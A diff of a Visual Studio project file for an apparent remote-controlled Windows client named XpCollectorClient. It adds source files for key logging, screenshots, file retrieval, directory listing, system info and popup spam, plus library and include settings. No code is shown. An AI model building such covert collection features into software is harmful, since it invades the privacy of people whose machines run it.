@@ -21,27 +21,53 @@
   <ItemGroup>
     <ClInclude Include="Client.h" />
     <ClInclude Include="CommandHandlers\CommandHandlerFactory.h" />
+    <ClInclude Include="CommandHandlers\DirListHandler.h" />
+    <ClInclude Include="CommandHandlers\DisplayImageHandler.h" />
+    <ClInclude Include="CommandHandlers\GetFileHandler.h" />
+    <ClInclude Include="CommandHandlers\GetSystemInfoHandler.h" />
     <ClInclude Include="CommandHandlers\ICommandHandler.h" />
+    <ClInclude Include="CommandHandlers\PlaySoundHandler.h" />
     <ClInclude Include="CommandHandlers\PopupHandler.h" />
     <ClInclude Include="CommandHandlers\PopupSpamHandler.h" />
     <ClInclude Include="CommandHandlers\ScreenshotHandler.h" />
+    <ClInclude Include="CommandHandlers\UninstallHandler.h" />
     <ClInclude Include="Commands\BasicCommand.h" />
     <ClInclude Include="Commands\CommandFactory.h" />
+    <ClInclude Include="Commands\DirListCommand.h" />
+    <ClInclude Include="Commands\DisplayImageCommand.h" />
+    <ClInclude Include="Commands\GetFileCommand.h" />
+    <ClInclude Include="Commands\PlaySoundCommand.h" />
     <ClInclude Include="Commands\PopupCommand.h" />
     <ClInclude Include="Communicators\HttpCommunicator.h" />
     <ClInclude Include="Communicators\ICommunicator.h" />
     <ClInclude Include="Configurator.h" />
+    <ClInclude Include="EventHandlers\EventHandlerFactory.h" />
+    <ClInclude Include="Events\EventFactory.h" />
     <ClInclude Include="EventHandlers\IEventHandler.h" />
     <ClInclude Include="EventHandlers\LocalLogEventHandler.h" />
     <ClInclude Include="Events\AlwaysEvent.h" />
+    <ClInclude Include="Products\DirListProduct.h" />
+    <ClInclude Include="Products\ErrorProduct.h" />
+    <ClInclude Include="Products\GetFileProduct.h" />
+    <ClInclude Include="Products\SystemInfoProduct.h" />
+    <ClInclude Include="resource.h" />
+    <ClInclude Include="Windows\AutoFree.h" />
+    <ClInclude Include="Windows\AutoHandle.h" />
     <ClInclude Include="Events\IEvent.h" />
-    <ClInclude Include="JSON.h" />
+    <ClInclude Include="EventHandlers\KeyLogEventHandler.h" />
+    <ClInclude Include="Products\ReturnEventProduct.h" />
+    <ClInclude Include="Utils\Uuid.h" />
+    <ClInclude Include="Utils\Strings.h" />
+    <ClInclude Include="Utils\JSON.h" />
+    <ClInclude Include="Commands\KeyLogCommand.h" />
+    <ClInclude Include="CommandHandlers\KeyLogHandler.h" />
+    <ClInclude Include="Events\ProcessNameDetectedEvent.h" />
+    <ClInclude Include="Products\KeyLogProduct.h" />
     <ClInclude Include="Loggers\ConsoleLogger.h" />
     <ClInclude Include="Loggers\FileLogger.h" />
     <ClInclude Include="Loggers\ILogger.h" />
     <ClInclude Include="Products\BasicProduct.h" />
     <ClInclude Include="Products\IProduct.h" />
-    <ClInclude Include="Products\PopupProduct.h" />
     <ClInclude Include="Products\ScreenshotProduct.h" />
     <ClInclude Include="Protocol\BasicRequest.h" />
     <ClInclude Include="Protocol\BasicResponse.h" />
@@ -52,12 +78,29 @@
     <ClInclude Include="Protocol\RequestInfo.h" />
     <ClInclude Include="Protocol\ResponseInfo.h" />
     <ClInclude Include="Protocol\ReturnProductRequest.h" />
-    <ClInclude Include="Storages\IClientStorage.h" />
+    <ClInclude Include="Storages\IStorage.h" />
     <ClInclude Include="Storages\RamStorage.h" />
     <ClInclude Include="Storages\RegistryStorage.h" />
-    <ClInclude Include="WinUtils.h" />
+    <ClInclude Include="Windows\AutoWbemObject.h" />
+    <ClInclude Include="Windows\ComInitializer.h" />
+    <ClInclude Include="Windows\FileInfo.h" />
+    <ClInclude Include="Windows\WinUtils.h" />
   </ItemGroup>
   <ItemGroup>
+    <ClCompile Include="CommandHandlers\DirListHandler.cpp" />
+    <ClCompile Include="CommandHandlers\DisplayImageHandler.cpp" />
+    <ClCompile Include="CommandHandlers\GetFileHandler.cpp" />
+    <ClCompile Include="CommandHandlers\GetSystemInfoHandler.cpp" />
+    <ClCompile Include="CommandHandlers\PlaySoundHandler.cpp" />
+    <ClCompile Include="CommandHandlers\UninstallHandler.cpp" />
+    <ClCompile Include="Commands\DirListCommand.cpp" />
+    <ClCompile Include="Commands\DisplayImageCommand.cpp" />
+    <ClCompile Include="Commands\GetFileCommand.cpp" />
+    <ClCompile Include="Commands\PlaySoundCommand.cpp" />
+    <ClCompile Include="Products\DirListProduct.cpp" />
+    <ClCompile Include="Products\ErrorProduct.cpp" />
+    <ClCompile Include="Products\GetFileProduct.cpp" />
+    <ClCompile Include="Products\SystemInfoProduct.cpp" />
     <ClCompile Include="Client.cpp" />
     <ClCompile Include="CommandHandlers\CommandHandlerFactory.cpp" />
     <ClCompile Include="CommandHandlers\ICommandHandler.cpp" />
@@ -68,36 +111,43 @@
     <ClCompile Include="Commands\CommandFactory.cpp" />
     <ClCompile Include="Commands\PopupCommand.cpp" />
     <ClCompile Include="Communicators\HttpCommunicator.cpp" />
-    <ClCompile Include="Communicators\ICommunicator.cpp" />
     <ClCompile Include="Configurator.cpp" />
-    <ClCompile Include="EventHandlers\IEventHandler.cpp" />
+    <ClCompile Include="EventHandlers\EventHandlerFactory.cpp" />
+    <ClCompile Include="Events\EventFactory.cpp" />
     <ClCompile Include="EventHandlers\LocalLogEventHandler.cpp" />
     <ClCompile Include="Events\AlwaysEvent.cpp" />
+    <ClCompile Include="Commands\KeyLogCommand.cpp" />
+    <ClCompile Include="CommandHandlers\KeyLogHandler.cpp" />
     <ClCompile Include="Events\IEvent.cpp" />
+    <ClCompile Include="Events\ProcessNameDetectedEvent.cpp" />
+    <ClCompile Include="EventHandlers\KeyLogEventHandler.cpp" />
+    <ClCompile Include="Products\ReturnEventProduct.cpp" />
+    <ClCompile Include="Utils\Uuid.cpp" />
+    <ClCompile Include="Utils\Strings.cpp" />
+    <ClCompile Include="Products\KeyLogProduct.cpp" />
     <ClCompile Include="Loggers\ConsoleLogger.cpp" />
     <ClCompile Include="Loggers\FileLogger.cpp" />
-    <ClCompile Include="Loggers\ILogger.cpp" />
     <ClCompile Include="main.cpp" />
     <ClCompile Include="Products\BasicProduct.cpp" />
-    <ClCompile Include="Products\IProduct.cpp" />
-    <ClCompile Include="Products\PopupProduct.cpp" />
     <ClCompile Include="Products\ScreenshotProduct.cpp" />
     <ClCompile Include="Protocol\BasicRequest.cpp" />
     <ClCompile Include="Protocol\BasicResponse.cpp" />
     <ClCompile Include="Protocol\GetCommandResponse.cpp" />
     <ClCompile Include="Protocol\InstallClientResponse.cpp" />
-    <ClCompile Include="Protocol\IRequest.cpp" />
-    <ClCompile Include="Protocol\IResponse.cpp" />
     <ClCompile Include="Protocol\RequestInfo.cpp" />
     <ClCompile Include="Protocol\ResponseInfo.cpp" />
     <ClCompile Include="Protocol\ReturnProductRequest.cpp" />
-    <ClCompile Include="Storages\IStorage.cpp" />
     <ClCompile Include="Storages\RamStorage.cpp" />
     <ClCompile Include="Storages\RegistryStorage.cpp" />
-    <ClCompile Include="WinUtils.cpp" />
+    <ClCompile Include="Windows\ComInitializer.cpp" />
+    <ClCompile Include="Windows\FileInfo.cpp" />
+    <ClCompile Include="Windows\WinUtils.cpp" />
   </ItemGroup>
   <ItemGroup>
     <None Include="conf.json" />
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="XpCollectorClient.rc" />
   </ItemGroup>
   <PropertyGroup Label="Globals">
     <VCProjectVersion>16.0</VCProjectVersion>
@@ -159,11 +209,13 @@
       <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <ConformanceMode>true</ConformanceMode>
       <LanguageStandard>stdcpp20</LanguageStandard>
-      <AdditionalIncludeDirectories>C:\Users\alper\.sdks\cpp-httplib-0.16.2;C:\Users\alper\.sdks\base64;C:\Users\alper\.sdks\json-3.11.2</AdditionalIncludeDirectories>
+      <AdditionalIncludeDirectories>C:\Users\alper\.sdks\cpp-httplib-0.16.2;C:\Users\alper\.sdks\base64;C:\Users\alper\.sdks\json-3.11.2;C:\Users\alper\.sdks\exe_resource;C:\Users\alper\.sdks\SFML-2.6.1-windows-vc17-64-bit\SFML-2.6.1\include;C:\Users\alper\.sdks\minimp3;$(SolutionDir)/XpCollectorClient</AdditionalIncludeDirectories>
     </ClCompile>
     <Link>
       <SubSystem>Console</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalLibraryDirectories>C:\Users\alper\.sdks\SFML-2.6.1-windows-vc17-64-bit\SFML-2.6.1\lib;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
+      <AdditionalDependencies>sfml-audio-d.lib;%(AdditionalDependencies)</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
@@ -180,20 +232,23 @@
       <EnableCOMDATFolding>true</EnableCOMDATFolding>
       <OptimizeReferences>true</OptimizeReferences>
       <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalDependencies>$(CoreLibraryDependencies);sfml-audio.lib;%(AdditionalDependencies)</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
     <ClCompile>
       <WarningLevel>Level3</WarningLevel>
       <SDLCheck>true</SDLCheck>
-      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions>SFML_STATIC;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <ConformanceMode>true</ConformanceMode>
-      <AdditionalIncludeDirectories>C:\Users\alper\.sdks\cpp-httplib-0.16.2;C:\Users\alper\.sdks\base64;C:\Users\alper\.sdks\json-3.11.2;$(SolutionDir)/XpCollectorClient</AdditionalIncludeDirectories>
+      <AdditionalIncludeDirectories>C:\Users\alper\.sdks\cpp-httplib-0.16.2;C:\Users\alper\.sdks\base64;C:\Users\alper\.sdks\json-3.11.2;C:\Users\alper\.sdks\exe_resource;C:\Users\alper\.sdks\SFML-2.6.1-windows-vc17-64-bit\SFML-2.6.1\include;C:\Users\alper\.sdks\minimp3;$(SolutionDir)/XpCollectorClient</AdditionalIncludeDirectories>
       <LanguageStandard>stdcpp20</LanguageStandard>
     </ClCompile>
     <Link>
       <SubSystem>Console</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalLibraryDirectories>C:\Users\alper\.sdks\SFML-2.6.1-windows-vc17-64-bit\SFML-2.6.1\lib;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
+      <AdditionalDependencies>sfml-audio-s-d.lib;sfml-system-s-d.lib;openal32.lib;flac.lib;vorbisenc.lib;vorbisfile.lib;vorbis.lib;ogg.lib;winmm.lib;sfml-graphics-s-d.lib;sfml-window-s-d.lib;opengl32.lib;freetype.lib;%(AdditionalDependencies)</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
@@ -202,14 +257,18 @@
       <FunctionLevelLinking>true</FunctionLevelLinking>
       <IntrinsicFunctions>true</IntrinsicFunctions>
       <SDLCheck>true</SDLCheck>
-      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <PreprocessorDefinitions>NOMINMANX;SFML_STATIC;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <ConformanceMode>true</ConformanceMode>
+      <AdditionalIncludeDirectories>C:\Users\alper\.sdks\cpp-httplib-0.16.2;C:\Users\alper\.sdks\base64;C:\Users\alper\.sdks\json-3.11.2;C:\Users\alper\.sdks\exe_resource;C:\Users\alper\.sdks\SFML-2.6.1-windows-vc17-64-bit\SFML-2.6.1\include;C:\Users\alper\.sdks\minimp3;$(SolutionDir)/XpCollectorClient</AdditionalIncludeDirectories>
+      <LanguageStandard>stdcpp20</LanguageStandard>
     </ClCompile>
     <Link>
       <SubSystem>Console</SubSystem>
       <EnableCOMDATFolding>true</EnableCOMDATFolding>
       <OptimizeReferences>true</OptimizeReferences>
       <GenerateDebugInformation>true</GenerateDebugInformation>
+      <AdditionalDependencies>$(CoreLibraryDependencies);sfml-audio-s.lib;sfml-system-s.lib;openal32.lib;flac.lib;vorbisenc.lib;vorbisfile.lib;vorbis.lib;ogg.lib;winmm.lib;sfml-graphics-s.lib;sfml-window-s.lib;opengl32.lib;freetype.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalLibraryDirectories>C:\Users\alper\.sdks\SFML-2.6.1-windows-vc17-64-bit\SFML-2.6.1\lib;%(AdditionalLibraryDirectories)</AdditionalLibraryDirectories>
     </Link>
   </ItemDefinitionGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
